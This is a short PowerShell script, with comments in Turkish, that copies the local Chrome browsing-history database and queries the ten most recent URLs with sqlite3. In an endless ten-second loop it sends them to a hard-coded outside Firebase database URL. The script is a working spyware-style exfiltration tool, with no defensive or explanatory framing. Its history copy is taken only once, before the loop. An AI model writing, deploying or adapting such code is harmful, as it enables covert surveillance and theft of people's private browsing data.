# Firebase URL
$firebaseUrl = "https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/history.json"

# Geçici tarayıcı geçmişi dosyasının yolu
$historyPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
$tempPath = "$env:TEMP\temp_history.db"

# Geçmiş dosyasını geçici klasöre kopyala
Copy-Item -Path $historyPath -Destination $tempPath -Force

# İlk başta, geçmişi kontrol et
$oldUrls = & {
    sqlite3.exe $tempPath "SELECT url FROM urls ORDER BY last_visit_time DESC LIMIT 10;" 2>&1
}

# Firebase’e göndermek için bir fonksiyon
function SendToFirebase {
    param(
        [string]$data
    )
    
    $jsonData = @{ visited = $data } | ConvertTo-Json -Depth 2
    try {
        Invoke-RestMethod -Uri $firebaseUrl -Method PUT -Body $jsonData
    } catch {
        Write-Output "HATA: $_"
    }
}

# Tarayıcıyı izleme: Geçmiş dosyasındaki değişiklikleri belirli aralıklarla kontrol et
while ($true) {
    # Yeni geçmişi kontrol et
    $newUrls = & {
        sqlite3.exe $tempPath "SELECT url FROM urls ORDER BY last_visit_time DESC LIMIT 10;" 2>&1
    }

    # Eğer geçmiş değiştiyse, Firebase’e gönder
    if ($oldUrls -ne $newUrls) {
        Write-Host "Yeni geçmiş bulundu. Firebase’e gönderiliyor..."
        SendToFirebase -data $newUrls
        $oldUrls = $newUrls
    }

    # Belirli bir aralıkta tekrar kontrol et (örneğin her 10 saniyede bir)
    Start-Sleep -Seconds 10
}
